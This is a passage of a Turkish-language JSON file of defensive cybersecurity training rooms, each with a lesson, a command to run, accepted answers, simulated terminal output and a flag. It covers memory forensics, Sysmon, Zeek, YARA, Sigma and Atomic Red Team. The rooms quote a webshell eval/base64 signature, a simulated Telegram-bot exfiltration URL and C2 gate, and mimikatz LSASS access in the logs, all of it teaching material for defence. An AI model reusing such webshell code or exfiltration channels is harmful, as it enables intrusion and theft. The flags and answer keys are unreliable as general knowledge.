        "hintExplanation": "<p><strong>vol:</strong> Dünyanın 1 numaralı canlı RAM (uçucu bellek) adli bilişim aracı olan Volatility 3 komutudur.</p>\n<p><strong>-f memdump.raw:</strong> İncelenecek canlı bellek dökümü dosyasını belirtir.</p>\n<p><strong>windows.malfind:</strong> Bellekte hem yazılabilir hem çalıştırılabilir (PAGE_EXECUTE_READWRITE) olan ve içine yabancı kod sokulmuş şüpheli proses bölgelerini otomatik avlayan eklentidir.</p>",
        "terminalSuccessOutput": "Volatility 3 Framework 2.4.1\nPID    Process        Start VPN           Tag    Protection\n4288   explorer.exe   0x0000021a8c00000   Vad    PAGE_EXECUTE_READWRITE\n0x0000021a8c00000  4d 5a 90 00 03 00 00 00  MZ...... (Zararlı PE Enjeksiyonu Tespit Edildi!)\n[FLAG] LFL{volatility_memory_injection_discovered}",
        "flag": "LFL{volatility_memory_injection_discovered}",
        "nextId": "blue-303"
    },
    {
        "id": "blue-303",
        "track": "blue",
        "title": "Tersine Mühendislik & Zararlı Analizi: Strings Analizi",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "MALWARE ANALYSIS & TRIAGE",
        "theory": "### Zararlının İç Anatomisi: Statik ve Dinamik Analiz\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir bomba uzmanı şüpheli bir paket bulduğunda önce sallamadan röntgenini çeker (Statik Analiz). İçinde saat pili, kablo ve dinamit olduğunu anlar. Daha sonra güvenli bir çelik odada (Sandbox) kontrollü olarak patlatır ve etkisine bakar (Dinamik Analiz).\n\nMüdahale ekibinin eline geçen şüpheli dosyanın ne yaptığını, hangi sunucuyla konuştuğunu ve şifreleme anahtarını bulmak için zararlı yazılım analizi yapılır.\n\n#### 1. Statik Analiz:\n* **Strings Analizi:** İkili dosya içindeki okunabilir metinler dökülür (C2 domainleri, IP adresleri, fonksiyon isimleri).",
        "mission": "Şüpheli fatura_belgesi.exe dosyasının statik strings çıktısını filtreleyerek gömülü C2 sunucu adresini açığa çıkarın.",
        "expectedCommand": "strings fatura_belgesi.exe | grep -iE \"http|https\"",
        "acceptedCommands": [
            "strings fatura_belgesi.exe | grep -iE 'http|https'",
            "strings fatura_belgesi.exe | grep http",
            "strings fatura_belgesi.exe"
        ],
        "hintExplanation": "<p><strong>strings:</strong> Bir çalıştırılabilir dosyanın (exe, bin) içindeki okunabilir insan yazılarını ekrana döker.</p>\n<p><strong>|:</strong> Bir komutun çıktısını diğer komutun girdisine bağlar.</p>\n<p><strong>grep -iE \"http|https\":</strong> Dosya içindeki binlerce anlamsız yazının arasından yalnızca web adreslerini (saldırganın iletişim kurduğu C2 sunucusunu) ayıklar.</p>",
        "terminalSuccessOutput": "[STRINGS STATIK TRIYAZ ÇIKTISI]\nhttps://api.telegram.org/bot7128912/sendMessage [Zararlı C2 Exfiltration Kanalı]\nhttp://dark-nexus.lfl/gate.php?beacon=\n[ANALİZ TAMAMLANDI]: Dosya Telegram Bot API'sini gizli C2 tüneli olarak kullanan bir Stealer!\n[FLAG] LFL{malware_static_strings_stealer_triaged}",
        "flag": "LFL{malware_static_strings_stealer_triaged}",
        "nextId": "blue-304"
    },
    {
        "id": "blue-304",
        "track": "blue",
        "title": "Sysmon & Windows Event IDs: Proses Enjeksiyonu Avı",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "SYSMON & PROCESS INJECTION HUNTING",
        "theory": "### Belleğin İçindeki Hayalet: Prozess Enjeksiyonu Tespiti\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir hırsızın binaya kendi girmek yerine, binadaki temizlikçinin sırt çantasına gizlice bomba veya telsiz koyup içeri sokması gibidir. Saldırgan `explorer.exe` veya `svchost.exe` gibi masum bir sistem prosesinin belleğine kendi zararlı kodunu enjekte eder (CreateRemoteThread).\n\n#### Kritik Sysmon Olay Kimlikleri (Event IDs):\n* **Event ID 1:** Process Creation (Kim kimi başlattı? Parent-Child analizi).\n* **Event ID 8:** CreateRemoteThread (Başka bir prosesin belleğinde iş parçacığı açma - Enjeksiyon alarmı!).\n* **Event ID 10:** ProcessAccess (LSASS belleğine şüpheli okuma isteği - Mimikatz avı!).",
        "mission": "Sysmon günlüğünden LSASS bellek erişim girişimlerini (Event ID 10) filtrelemek için Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5 komutunu çalıştırın.",
        "expectedCommand": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5",
        "acceptedCommands": [
                "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10} -MaxEvents 5",
                "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=10}",
                "wevtutil qe Microsoft-Windows-Sysmon/Operational /q:\"*[System[(EventID=10)]]\" /c:5"
        ],
        "hintExplanation": "<p><strong>Get-WinEvent:</strong> PowerShell ile modern Windows olay günlüklerini sorgulama cmdlet'idir.</p><p><strong>ID=10:</strong> Sysmon'un proses erişim olay kodudur.</p>",
        "terminalSuccessOutput": "TimeCreated          Id LevelDisplayName Message\n-----------          -- ---------------- -------\n08.11.2026 21:12:01  10 Information      Process accessed:\n  SourceImage: C:\\Users\\Public\\mimikatz.exe\n  TargetImage: C:\\Windows\\System32\\lsass.exe\n  GrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)\n  CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9fb34\n[ALARM!] Mimikatz tarafından LSASS prosesine yetkisiz bellek erişimi tespit edildi!\n[FLAG] LFL{blue_sysmon_event10_lsass_tamper_detected}",
        "flag": "LFL{blue_sysmon_event10_lsass_tamper_detected}",
        "nextId": "blue-305"
},
    {
        "id": "blue-305",
        "track": "blue",
        "title": "Ağ Tehdit Avı: Zeek ile C2 Beaconing ve Jitter Analizi",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "ZEEK NETWORK BEACON HUNTING",
        "theory": "### Gizli Telsiz Sinyallerini Yakalamak: C2 Beaconing Tespiti\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir casus yakalanmamak için her 60 saniyede bir merkeze 1 saniyelik şifreli fısıltı gönderir. Güvenlik görevlisi günlerce bekler ve bakar ki her 60 saniyede bir aynı kapıdan bir sinyal çıkıyor. Bu periyodik ritim (Beaconing) casusu ele verir.\n\n#### Zeek (Bro) ile Trafik Analizi:\nZeek devasa PCAP dosyalarını ayrıştırıp `conn.log`, `http.log`, `dns.log` gibi tertemiz metin loglarına dönüştürür. `zeek-cut` komutuyla hedef IP'lere giden bağlantı süreleri ve veri baytları süzülerek ritmik bağlantılar anında ifşa edilir.",
        "mission": "Zeek conn.log dosyasından kaynak, hedef IP ve bağlantı sürelerini süzmek için cat conn.log | zeek-cut id.orig_h id.resp_h duration komutunu çalıştırın.",
        "expectedCommand": "cat conn.log | zeek-cut id.orig_h id.resp_h duration",
        "acceptedCommands": [
                "cat conn.log | zeek-cut id.orig_h id.resp_h duration",
                "zeek-cut id.orig_h id.resp_h duration < conn.log",
                "cat conn.log | zeek-cut id.orig_h id.resp_h"
        ],
        "hintExplanation": "<p><strong>zeek-cut:</strong> Zeek loglarındaki belirli sütunları çeken hızlı CLI aracıdır.</p><p><strong>duration:</strong> Bağlantının ne kadar sürdüğünü gösterir.</p>",
        "terminalSuccessOutput": "192.168.1.105   185.220.101.4   60.01\n192.168.1.105   185.220.101.4   60.03\n192.168.1.105   185.220.101.4   59.98\n192.168.1.105   185.220.101.4   60.02\n[TEHDİT KANITI] 185.220.101.4 IP adresine her 60 saniyede bir C2 Beacon gönderildiği doğrulandı!\n[FLAG] LFL{blue_zeek_c2_beaconing_jitter_uncovered}",
        "flag": "LFL{blue_zeek_c2_beaconing_jitter_uncovered}",
        "nextId": "blue-306"
},
    {
        "id": "blue-306",
        "track": "blue",
        "title": "İmza Tabanlı Tehdit Tespiti: YARA ile Web Shell Avcılığı",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "YARA WEBSHELL DETECTION",
        "theory": "### Zararlı Kodun DNA'sını Yakalamak: YARA Kuralları\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir katilin parmak izi veya kolundaki ejderha dövmesi gibidir. Saldırgan dosya adını `resim.jpg` veya `style.css` yapsa bile, dosyanın içindeki `eval(base64_decode($_POST['cmd']))` kod parçasını YARA kuralı anında yakalar.\n\n#### YARA Kuralının Yapısı:\n* **meta:** Kural yazarı, açıklama ve tarih.\n* **strings:** Aranacak metin veya onaltılık (hex) bayt dizgisi.\n* **condition:** Kuralların mantıksal birleşimi (Örn: `filesize < 500KB and 2 of ($s*)`).",
        "mission": "Web dizinindeki PHP web shell dosyalarını YARA kurallarıyla taramak için yara -r /etc/yara/webshell_rules.yar /var/www/html/ komutunu çalıştırın.",
        "expectedCommand": "yara -r /etc/yara/webshell_rules.yar /var/www/html/",
        "acceptedCommands": [
                "yara -r /etc/yara/webshell_rules.yar /var/www/html/",
                "yara /etc/yara/webshell_rules.yar /var/www/html/ -r",
                "yara -r webshell_rules.yar /var/www/html/"
        ],
        "hintExplanation": "<p><strong>yara:</strong> Zararlı yazılım örüntü arama motorudur.</p><p><strong>-r:</strong> Belirtilen dizini alt klasörleriyle birlikte özyinelemeli (recursive) tarar.</p>",
        "terminalSuccessOutput": "PHP_Obfuscated_Webshell /var/www/html/uploads/avatars/profile_42.php\n  0x14f:$eval_str: \"eval(gzinflate(base64_decode(\"\n  0x2a0:$b64_pass: \"c3VwZXJzZWNyZXQ=\"\n[TEHDİT İMHA EDİLDİ] Sahte profil resmi içine gizlenmiş tehlikeli bir PHP Web Shell yakalandı!\n[FLAG] LFL{blue_yara_webshell_signature_hunting_success}",
        "flag": "LFL{blue_yara_webshell_signature_hunting_success}",
        "nextId": "blue-307"
},
    {
        "id": "blue-307",
        "track": "blue",
        "title": "Evrensel Tehdit Dili: Sigma Kuralını SIEM Sorgusuna Çevirme",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "SIGMA DETECTION CONVERSION",
        "theory": "### SIEM Üretici Bağımsızlığı: Sigma Standardı\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nDünyada herkesin anladığı ortak İngilizce gibidir. Bir tehdit kuralını bir kez Sigma (YAML) formatında yazarsınız; ardından tek bir komutla Splunk SPL'e, Elastic Lucene'e, Microsoft Sentinel KQL'e veya QRadar AQL'e otomatik dönüştürürsünüz.\n\n#### Sigmac / Sigma-CLI Kullanımı:\n`sigma convert -t splunk rule.yml` çalıştırıldığında YAML kuralı anında `index=windows EventCode=1 Image=*\\whoami.exe` gibi yerel sorgu diline çevrilir.",
        "mission": "whoami_priv.yml kuralını Splunk arama sorgusu formatına dönüştürmek için sigma convert -t splunk rules/windows/whoami_priv.yml komutunu çalıştırın.",
        "expectedCommand": "sigma convert -t splunk rules/windows/whoami_priv.yml",
        "acceptedCommands": [
                "sigma convert -t splunk rules/windows/whoami_priv.yml",
                "sigmac -t splunk rules/windows/whoami_priv.yml",
                "sigma convert -t splunk whoami_priv.yml"
        ],
        "hintExplanation": "<p><strong>sigma convert:</strong> Sigma kuralını hedef SIEM diline derleyen motordur.</p><p><strong>-t splunk:</strong> Çıktıyı Splunk sorgusu olarak üretir.</p>",
        "terminalSuccessOutput": "(EventCode=\"1\" (Image=\"*\\\\whoami.exe\" CommandLine=\"*/priv*\"))\n[DERLEME BAŞARILI] Sigma kuralı geçerli bir Splunk SPL sorgusuna dönüştürüldü!\n[DÖNÜŞÜM TAMAM] SOC analistleri artık bu kuralı SIEM'de canlı uyarıya bağlayabilir.\n[FLAG] LFL{blue_sigma_universal_rule_converted_to_siem}",
        "flag": "LFL{blue_sigma_universal_rule_converted_to_siem}",
        "nextId": "blue-308"
},
    {
        "id": "blue-308",
        "track": "blue",
        "title": "Disk Adli Bilişimi: $MFT ve Olay Zaman Çizelgesi (Timelining)",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "FORENSIC TIMELINING & MFT",
        "theory": "### Diskin Kara Kutusu: $MFT (Master File Table)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nUçak kazasından sonra uçağın kara kutusunu dinlemek gibidir. Saldırgan dosyayı silse bile NTFS dosya sistemindeki $MFT tablosu dosyanın ne zaman oluşturulduğunu, değiştirildiğini ve silindiğini (MACB: Modified, Accessed, Created, Born) saniyesi saniyesine saklar.\n\n#### Sleuth Kit & Mactime:\n`fls` aracı disk imajındaki tüm dosyaların zaman damgalarını döker; `mactime` ise bunları kronolojik bir olay zincirine (Timeline) dönüştürerek saldırganın hangi saatte hangi dizine girdiğini ortaya koyar.",
        "mission": "fls aracıyla disk imajındaki dosya meta verilerini çekip olay zaman çizelgesini oluşturmak için fls -r -m C: image.dd | head -n 5 komutunu çalıştırın.",
        "expectedCommand": "fls -r -m C: image.dd | head -n 5",
        "acceptedCommands": [
                "fls -r -m C: image.dd | head -n 5",
                "fls -r -m C: image.dd",
                "fls -m C: image.dd | head -n 5"
        ],
        "hintExplanation": "<p><strong>fls:</strong> The Sleuth Kit (TSK) dosya listeleme komutudur.</p><p><strong>-m C::</strong> Dosya yollarını mactime zaman çizelgesi formatında biçimlendirir.</p>",
        "terminalSuccessOutput": "0|C:/Windows/Temp/mimikatz.exe|0|d/drwxrwxrwx|0|0|1024|1762635600|1762635601|1762635601|1762635600\n0|C:/Windows/System32/Tasks/TelemetryUpdate|0|r/rrwxrwxrwx|0|0|2048|1762635720|1762635720|1762635720|1762635720\n[ZAMAN ÇİZELGESİ ÇIKARILDI] 21:00'da zararlı dosyanın yüklendiği ve 21:02'de zamanlanmış görev oluşturulduğu ispatlandı!\n[FLAG] LFL{blue_mft_filesystem_forensic_timeline_created}",
        "flag": "LFL{blue_mft_filesystem_forensic_timeline_created}",
        "nextId": "blue-309"
},
    {
        "id": "blue-309",
        "track": "blue",
        "title": "E-Posta Güvenliği: Oltalama (Phishing) Başlık Analizi",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "EMAIL FORENSICS & DMARC",
        "theory": "### Sahte Mektubun İpliğini Pazara Çıkarmak: E-Posta Header Analizi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nSize 'Banka Genel Müdürü' imzasıyla gelen bir mektubun üzerindeki posta pulunu mikroskopla incelemek gibidir. Mektubun üzerinde bankanın logosu olsa bile, posta damgasının Nijerya'dan vurulduğunu görmek mektubun sahte olduğunu kanıtlar.\n\n#### SPF, DKIM ve DMARC Üçlüsü:\n* **SPF (Sender Policy Framework):** Bu sunucunun şirket adına e-posta gönderme yetkisi var mı?\n* **DKIM (DomainKeys Identified Mail):** E-posta yoldayken değiştirildi mi (Kriptografik imza)?\n* **DMARC:** SPF veya DKIM başarısız olursa mektubu çöpe at (p=reject) kuralı.",
        "mission": "Şüpheli fatura e-postasının kimlik doğrulama başlıklarını incelemek için grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml komutunu çalıştırın.",
        "expectedCommand": "grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml",
        "acceptedCommands": [
                "grep -E 'Authentication-Results|Received-SPF|dmarc' invoice.eml",
                "grep -E \"Authentication-Results|Received-SPF|dmarc\" invoice.eml",
                "grep -i 'spf' invoice.eml"
        ],
        "hintExplanation": "<p><strong>grep -E:</strong> Çoklu anahtar kelimeleri regex mantığıyla tek seferde arar.</p><p><strong>invoice.eml:</strong> İncelenen ham e-posta formatındaki şüpheli dosyadır.</p>",
        "terminalSuccessOutput": "Received-SPF: Fail (protection.outlook.com: domain of evil-bank.com does not designate 194.26.29.11 as permitted sender)\nAuthentication-Results: spf=fail (sender IP is 194.26.29.11) smtp.mailfrom=evil-bank.com; dkim=fail; dmarc=fail\n[OLTALAMA KANITLANDI] Gönderici IP adresi bankanın SPF listesinde yok; DMARC FAIL verdi!\n[FLAG] LFL{blue_phishing_eml_header_dmarc_fail_analyzed}",
        "flag": "LFL{blue_phishing_eml_header_dmarc_fail_analyzed}",
        "nextId": "blue-310"
},
    {
        "id": "blue-310",
        "track": "blue",
        "title": "Olay Müdahale: Canlı RAM Dökümü & Tehdit İzolasyonu",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "LIVE MEMORY TRIAGE & INCIDENT RESPONSE",
        "theory": "### Bilgisayarı Kapatma, Delilleri Koru!: Canlı Bellek Müdahalesi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir suç mahalline giren polisin ilk kuralı 'Hiçbir şeye dokunma, parmak izlerini dondur'dur. Bilgisayar kapatılırsa RAM'deki tüm enjekte edilmiş zararlı kodlar ve şifreleme anahtarları sonsuza dek uçar. Önce ağ fişi çekilir (İzolasyon), ardından RAM kopyalanır.\n\n#### winpmem / LiME Araçları:\nÇalışan sistemin belleğini (RAM) fiziksel sektörlerden sıfır veri kaybıyla okuyup `memdump.raw` dosyası olarak harici güvenli diske döker.",
        "mission": "Saldırıya uğrayan makinenin canlı bellek dökümünü almak için winpmem.exe -o memdump.raw --volume_mode 2 komutunu çalıştırın.",
        "expectedCommand": "winpmem.exe -o memdump.raw --volume_mode 2",
        "acceptedCommands": [
                "winpmem.exe -o memdump.raw --volume_mode 2",
                "winpmem -o memdump.raw",
                "winpmem.exe -o memdump.raw"
        ],
        "hintExplanation": "<p><strong>winpmem:</strong> Windows işletim sistemlerinde açık kaynaklı RAM bellek döküm alma aracıdır.</p><p><strong>-o memdump.raw:</strong> Çıktının yazılacağı adli bellek imaj dosyasını belirtir.</p>",
        "terminalSuccessOutput": "WinPmem 4.0 - Physical Memory Imager\nDriver loaded successfully.\nCR3: 0x001aa000\nMemory size: 16384 MB (16.0 GB)\nWriting memory dump to memdump.raw.....\n[100%] Memory acquisition completed in 18.4 seconds.\nMD5 Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n[DELİL MÜHÜRLENDİ] Canlı RAM başarıyla imajlandı; Volatility analizine hazır!\n[FLAG] LFL{blue_incident_response_live_ram_dump_quarantined}",
        "flag": "LFL{blue_incident_response_live_ram_dump_quarantined}",
        "nextId": "blue-311"
},
    {
        "id": "blue-311",
        "track": "blue",
        "title": "Blue Team Zirvesi: Tehdit Savuşturma & Nihai Kök Neden Raporu",
        "level": "3. Olay Müdahalesi ve Adli Bilişim",
        "badge": "SOC INCIDENT REMEDIATION & ROOT CAUSE",
        "theory": "### Savunmanın Zirvesi: Saldırganı Kovup Sistemi Zırhlamak\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nYangını söndürdünüz, hastayı iyileştirdiniz ve binadaki tüm kırık kapıları çelik kapıyla değiştirdiniz. Şimdi şirket yönetim kuruluna 'Saldırgan şu oltalama e-postasından girdi, şu zafiyeti kullandı, şu saatte temizlendi ve bir daha asla giremez' diyerek nihai kök neden (Root Cause) raporunu sunuyorsunuz.\n\n#### 17 Blue Team Odasını Tamamladınız!\nSyslog'dan SIEM'e, Snort NIDS'ten Sysmon'a, Zeek'ten Volatility RAM analizine kadar uçtan uca modern bir Kıdemli SOC Analisti ve Adli Bilişim Uzmanı oldunuz.",
        "mission": "Nihai olay müdahale ve kök neden analiz raporunu okumak için cat /opt/soc/incident_reports/IR-2026-FINAL.txt komutunu çalıştırın.",
        "expectedCommand": "cat /opt/soc/incident_reports/IR-2026-FINAL.txt",
        "acceptedCommands": [
                "cat /opt/soc/incident_reports/IR-2026-FINAL.txt",
                "cat IR-2026-FINAL.txt",
                "more /opt/soc/incident_reports/IR-2026-FINAL.txt"
        ],
        "hintExplanation": "<p><strong>IR-2026-FINAL.txt:</strong> 17 odalık Blue Team savunma patikasını bitirdiğinizde açılan adli rapor bayrağıdır.</p>",
        "terminalSuccessOutput": "========================================================================\n🛡️ TEBRİKLER! BLUE TEAM DEFANSİF SAVUNMA PATİKASINI TAMAMLADINIZ! 🛡️\n========================================================================\n[KAZANILAN DEFANSİF YETKİNLİKLER]:\n✔ Log & SIEM Mimarisi: Syslog, Auth logları, Wazuh & Splunk Analizi\n✔ Ağ & Trafik Güvenliği: Snort, Suricata, Zeek & Wireshark Tehdit Avı\n✔ Uç Nokta Denetimi: Sysmon Event IDs (1, 8, 10) & YARA Kural Mühendisliği\n✔ Dijital Adli Bilişim & IR: Volatility RAM, MFT Zaman Çizelgesi & DMARC\n\n[BLUE TEAM NİHAİ BAYRAĞI]: LFL{blue_soc_incident_remediation_root_cause_solved}\n========================================================================",
        "flag": "LFL{blue_soc_incident_remediation_root_cause_solved}",
        "nextId": "purple-101"
},
    {
        "id": "purple-101",
        "track": "purple",
        "title": "MITRE ATT&CK & Cyber Kill Chain: TTP Haritalandırma",
        "level": "1. Metodoloji ve Çerçeve",
        "badge": "MITRE ATT&CK & TTPs",
        "theory": "### İki Cephenin Ortak Dili: Purple Team Zihniyeti\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir futbol maçında forvet (Red Team) sadece gol atmaya, defans (Blue Team) ise gol yememeye çalışır. Purple Team sahadaki teknik direktördür! \"Forvet soldan bindirme yaptığında defans nerede durmalıydı?\" analizini yapar ve taktikleri eşleştirir.\n\nPurple Team bağımsız bir silo veya üçüncü bir ekip olmaktan ziyade bir zihniyet ve metodolojidir.\n\n#### 1. TTP ve Log Karşılığı (Mapping):\nBir Purple Teamer sadece \"Saldırgan komut çalıştırdı\" demez. \"Saldırgan `T1059.001 (PowerShell)` tekniğini kullandı ve bu aktivite hedef hostta `Microsoft-Windows-PowerShell/Operational Event ID 4104 (Script Block Logging)` kaydı üretmelidir\" diyerek hücum ile tespiti birebir eşleştirir.",
        "mission": "Saldırganın kullandığı 'whoami /priv' komutunu MITRE ATT&CK Discovery taktiği altındaki T1033 tekniğiyle eşleştiren analiz doğrulamasını yapın.",
        "expectedCommand": "python3 mitre_mapper.py --technique T1033",
        "acceptedCommands": [
            "mitre-map --technique T1033 --command 'whoami /priv'",
            "mitre-map T1033",
            "python3 mitre_mapper.py"
        ],
        "hintExplanation": "<p><strong>python3 mitre_mapper.py:</strong> Saldırı komutlarını dünya standardı olan MITRE ATT&CK matrisiyle eşleştiren Purple Team otomasyon betiğidir.</p>\n<p><strong>--technique T1033:</strong> 'System Owner/User Discovery' tekniğidir. Bu teknik çalıştırıldığında hedef sistemde Sysmon Event ID 1 (Process Creation) logunun üretilmesi gerektiğini doğrular.</p>",
        "terminalSuccessOutput": "[PURPLE FRAMEWORK] TTP Eşleştirme Motoru\nTaktik: TA0007 (Discovery)\nTeknik: T1033 (System Owner/User Discovery)\nBeklenen Log Kaynağı: Sysmon Event ID 1 (Process Creation) / Security Event ID 4688\nTespit Eşiği: Standart kullanıcı kabuğunda ardışık yetki denetimi çağrısı.\n[FLAG] LFL{mitre_ttp_mapping_discovery_t1033}",
        "flag": "LFL{mitre_ttp_mapping_discovery_t1033}",
        "nextId": "purple-102"
    },
    {
        "id": "purple-102",
        "track": "purple",
        "title": "Ortak Raporlama & Boşluk Analizi (Gap Analysis)",
        "level": "1. Metodoloji ve Çerçeve",
        "badge": "GAP ANALYSIS & METRICS",
        "theory": "### Siloları Yıkmak: Hücum ve Savunma Diyaloğu\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nEvinizin etrafında 10 tane güvenlik kamerası var. Purple Team evin etrafını dolaşarak \"Hangi kameranın önünü ağaç dalı kapatmış, hangi köşede kör nokta kalmış?\" renkli ısı haritası (Heatmap) çıkarır ve kör noktaları gösterir.\n\nKlasik sızma testleri sonrasında Red Team 100 sayfalık teknik rapor bırakır, Blue Team ise günlük alarm gürültüsünde boğulur. Purple Team bu kopukluğu onarır.\n\n#### 1. Savunma Boşluğu (Gap Analysis):\n* Kırmızı Takım bir teknik denedi: Başarılı oldu mu?\n* Mavi Takım bunu gördü mü? (Tespit: Evet/Hayır)\n* Alarm üretti mi? (Alarm: Evet/Hayır)",
        "mission": "Son sızma testi bulguları için MITRE Navigator formatında boşluk analizi (Gap Analysis) özet raporunu derleyin.",
        "expectedCommand": "python3 gap_analysis.py --report pentest.json",
        "acceptedCommands": [
            "lfl-purple-matrix --generate-gap --input pentest_eval.json",
            "gap-analysis --report pentest.json",
            "python3 gap_analysis.py"
        ],
        "hintExplanation": "<p><strong>python3 gap_analysis.py:</strong> Hücum ile savunma ekiplerinin sonuçlarını karşılaştıran analiz betiğidir.</p>\n<p><strong>--report pentest.json:</strong> Pentest bulgularını girdi olarak alır ve 'Hangi saldırıları gördük, hangilerinde alarm vermedik?' sorusunun yanıtını (Isı Haritası - Heatmap) çıkarır.</p>",
        "terminalSuccessOutput": "[+] ATT&CK Navigator Katmanı Oluşturuldu...\nTest Edilen Teknik Sayısı: 48\nBaşarıyla Yakalanan (Detected): 29 (%60.4)\nLoglanan Ancak Alarm Vermeyen: 12 (%25.0)\nKÖRLÜK YAŞANAN TEKNİKLER (Blind Spots): 7 (%14.6)\n[Kritik Boşluk]: T1003.001 (LSASS Bellek Dökümü - Alarm üretmedi!)\n[FLAG] LFL{purple_gap_analysis_heatmap_scored}",
        "flag": "LFL{purple_gap_analysis_heatmap_scored}",
        "nextId": "purple-201"
    },
    {
        "id": "purple-201",
        "track": "purple",
        "title": "BAS ve Atomic Red Team: Birim Test Mantığıyla Güvenlik",
        "level": "2. Saldırı Simülasyonu ve Otomasyon",
        "badge": "BAS & ATOMIC RED TEAM",
        "theory": "### Yazılım Testi Gibi Güvenlik Testi: BAS & Atomic Tests\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nİtfaiyecilerin yangın çıkmasını beklemeden binanın ortasında kontrollü tatbikat dumanı sıkıp dedektörlerin ve fıskiyelerin çalışıp çalışmadığını tek tek denemesidir (Birim Test Mantığı).\n\nHer gün yüzlerce sunucuda tek tek manuel pentest yapmak imkansızdır. **BAS (Breach and Attack Simulation)** sistemleri, saldırgan tekniklerini güvenli ve kontrollü scriptlerle sürekli test eder.\n\n#### 1. Atomic Red Team (Red Canary):\nMITRE ATT&CK matrisindeki her bir teknik için yazılmış küçük, bağımsız test scriptleridir (PowerShell / Bash).\n* Sisteme gerçek fidye yazılımı bulaştırmaz; yalnızca o zararlının yaptığı operasyonu taklit eder.",
        "mission": "Atomic Red Team motorunu kullanarak T1082 (System Information Discovery) tekniğini simüle edin.",
        "expectedCommand": "Invoke-AtomicTest T1082 -TestNumbers 1",
        "acceptedCommands": [
            "powershell Invoke-AtomicTest T1082",
            "atomic-test T1082",
            "Invoke-AtomicTest T1082"
        ],
        "hintExplanation": "<p><strong>Invoke-AtomicTest:</strong> Red Canary tarafından geliştirilen ve saldırı tekniklerini zararsız mini testler olarak çalıştıran PowerShell fonksiyonudur.</p>\n<p><strong>T1082:</strong> 'System Information Discovery' tekniğidir (systeminfo.exe çalıştırılması).</p>\n<p><strong>-TestNumbers 1:</strong> Bu teknik altındaki 1 numaralı standart testi çalıştırır; böylece EDR'ın alarm verip vermediği anında doğrulanır.</p>",
        "terminalSuccessOutput": "PathToEngine: C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicTest.ps1\nExecuting test: T1082-1 System Information Discovery via systeminfo.exe\n[STDOUT]: Host Name: LFL-CORP-WORKSTATION ... OS Version: 10.0.19045\n[+] Test başarıyla tamamlandı.\n[BLUE VERIFICATION]: Sysmon Event ID 1 yakalandı: Parent=powershell.exe -> Child=systeminfo.exe\n[FLAG] LFL{atomic_red_team_t1082_simulated}",
        "flag": "LFL{atomic_red_team_t1082_simulated}",
        "nextId": "purple-202"
    },
    {
        "id": "purple-202",
        "track": "purple",
        "title": "Gelişmiş Simülasyon: Caldera & APTSimulator",
        "level": "2. Saldırı Simülasyonu ve Otomasyon",
        "badge": "CALDERA & APT EMULATION",
        "theory": "### Gerçek Düşmanı Taklit Etmek: APT Emülasyonu\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBanka güvenliğini test etmek için şehre profesyonel bir oyuncu çetesi gönderip bankanın kasasına giden tüm yolları adım adım canlandırmaktır (APT Emülasyonu).\n\nBireysel testlerin ötesinde, organize siber casusluk gruplarının (APT29 - Cozy Bear vb.) saldırı senaryolarını uçtan uca otomatik taklit eden sistemler kullanılır.\n\n#### 1. MITRE Caldera:\nAjan-tabanlı akıllı siber saldırı simülasyon platformudur.\n* Caldera sunucusuna bağlı ajanlar, verilen hedefe göre otonom olarak lateral movement yapar ve Blue Team'in hangi adımda saldırganı fark ettiğini kronometreyle ölçer.",
        "mission": "Caldera motoru üzerinde APT29 (Cozy Bear) siber casusluk grubunun saldırı profilini emüle eden tatbikatı başlatın.",
        "expectedCommand": "python3 caldera_runner.py --adversary \"APT29\"",
        "acceptedCommands": [
            "APTSimulator.bat --test-all",
            "caldera --adversary APT29",
            "python3 caldera_runner.py",
            "APTSimulator.bat"
        ],
        "hintExplanation": "<p><strong>python3 caldera_runner.py:</strong> MITRE Caldera otonom siber tatbikat platformunun tetikleyicisidir.</p>\n<p><strong>--adversary \"APT29\":</strong> Gerçek dünyadaki organize tehdit aktörü APT29 grubunun kullandığı taktik ve araçları taklit eder; kurum savunmasının bu aktöre karşı dayanıklılığı test edilir.</p>",
        "terminalSuccessOutput": "[Caldera v5.0] Running Adversary Emulation: APT29 (Cozy Bear)...\n[*] Step 1: User Discovery (whoami /groups) -> COMPLETED\n[*] Step 2: Persistence via Registry Run Key -> COMPLETED\n[*] Step 3: LSASS Memory Dump Simulation -> BLOCKED BY EDR!\n[BLUE TELEMETRY]: 24 Alarm Oluştu, 3 Davranış SIEM'e Düşmedi.\n[FLAG] LFL{apt_simulation_caldera_suite_executed}",
        "flag": "LFL{apt_simulation_caldera_suite_executed}",
        "nextId": "purple-301"
    },
    {
        "id": "purple-301",
        "track": "purple",
